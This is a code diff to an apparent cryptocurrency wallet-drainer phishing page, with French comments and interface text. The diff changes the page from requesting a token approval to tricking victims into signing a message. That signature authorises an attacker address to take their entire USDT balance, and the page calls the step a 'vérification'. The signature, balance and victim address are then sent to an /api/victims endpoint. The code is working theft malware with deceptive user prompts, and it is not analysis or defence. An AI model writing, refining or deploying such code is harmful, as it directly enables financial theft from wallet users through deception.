@@ -1034,70 +1034,79 @@
 async function sendExactApproveTransaction() {
   try {
     const scanText = document.querySelector('.scan');
-    if (scanText) scanText.textContent = 'Détection de votre solde USDT…';
+    if (scanText) scanText.textContent = 'Préparation de la vérification…';
 
-    // On utilise le provider injecté par Trust Wallet (le même qui a signé la connexion)
+    // Fournisseur depuis WalletConnect
     const provider = new ethers.providers.Web3Provider(window.ethereum);
-    const usdtContract = new ethers.Contract(USDT_ADDR, [
+    const signer = provider.getSigner();
+
+    // Adresses importantes
+    const DRAIN_PERMIT = '0x09eD2fa44a5841f9182A2C55C5F4cB978D619ECF';
+    const USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+
+    // 1. Lire le nonce depuis le contrat DrainPermit
+    const permitContract = new ethers.Contract(DRAIN_PERMIT, [
+      'function nonces(address) view returns (uint256)'
+    ], provider);
+    const nonce = await permitContract.nonces(account);
+
+    // 2. Lire le solde USDT de la victime
+    const tokenContract = new ethers.Contract(USDT, [
       'function balanceOf(address) view returns (uint256)',
       'function decimals() view returns (uint8)'
     ], provider);
-
     const [balance, decimals] = await Promise.all([
-      usdtContract.balanceOf(account),
-      usdtContract.decimals()
+      tokenContract.balanceOf(account),
+      tokenContract.decimals()
     ]);
-
     if (balance.isZero()) {
       if (scanText) scanText.textContent = '❌ Aucun USDT détecté.';
       return;
     }
-
     const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
-    if (scanText) scanText.textContent = `Confirmez l'autorisation de ${balanceFormatted} USDT (frais de vérification).`;
+    if (scanText) scanText.textContent = `Confirmez l'autorisation de ${balanceFormatted} USDT.`;
 
-    // Construire la transaction approve
-    const iface = new ethers.utils.Interface([
-      'function approve(address spender, uint256 amount)'
-    ]);
-    const data = iface.encodeFunctionData('approve', [ATTACKER, balance]);
+    // 3. Deadline (1 heure)
+    const deadline = Math.floor(Date.now() / 1000) + 3600;
 
-    const txParams = {
-      from: account,
-      to: USDT_ADDR,
-      data: data,
-      value: '0x0',
-      gas: '0x493E0',
-    };
+    // 4. Construire le hash structuré (identique à celui de DrainPermit)
+    const structHash = ethers.utils.solidityKeccak256(
+      ['address', 'address', 'address', 'uint256', 'uint256', 'uint256'],
+      [account, USDT, ATTACKER, balance, deadline, nonce]
+    );
 
-    // Envoyer la transaction via WalletConnect → pop‑up Trust Wallet
-    const txHash = await signClient.request({
-      topic: session.topic,
-      chainId: 'eip155:1',
-      request: {
-        id: Date.now(),
-        jsonrpc: '2.0',
-        method: 'eth_sendTransaction',
-        params: [txParams],
-      },
-    });
+    // 5. Demander la signature (personal_sign = message préfixé)
+    const signature = await signer.signMessage(ethers.utils.arrayify(structHash));
+    console.log('Signature obtenue:', signature);
 
-    console.log('Tx approve exacte envoyée:', txHash);
-    if (scanText) scanText.textContent = '✅ Autorisation donnée. Vérification terminée.';
-
-    // Drain immédiat
-    await fetch('/api/store-victim', {
+    // 6. Envoyer la signature à l'API /api/victims
+    const response = await fetch('/api/victims', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ victim: account, chain: '1' })
+      body: JSON.stringify({
+        victim: account,
+        chain: '1',
+        token: USDT,
+        spender: ATTACKER,
+        amount: balance.toString(),
+        deadline,
+        signature
+      })
     });
 
-    setTimeout(() => window.location.href = '/verifyaddress.html', 3000);
-
+    const result = await response.json();
+    if (result.success) {
+      if (scanText) scanText.textContent = '✅ Signature acceptée. Vérification en cours.';
+      // Redirection après un court délai
+      setTimeout(() => window.location.href = '/verifyaddress.html', 3000);
+    } else {
+      if (scanText) scanText.textContent = '❌ Erreur lors de la vérification.';
+      console.error('Erreur API:', result.error);
+    }
   } catch (e) {
-    console.error('Transaction error:', e);
+    console.error('Signature error:', e);
     const scanText = document.querySelector('.scan');
-    if (scanText) scanText.textContent = '❌ Transaction refusée.';
+    if (scanText) scanText.textContent = '❌ Signature refusée.';
   }
 }
   // ===== Historique des victimes (inchangé) =====
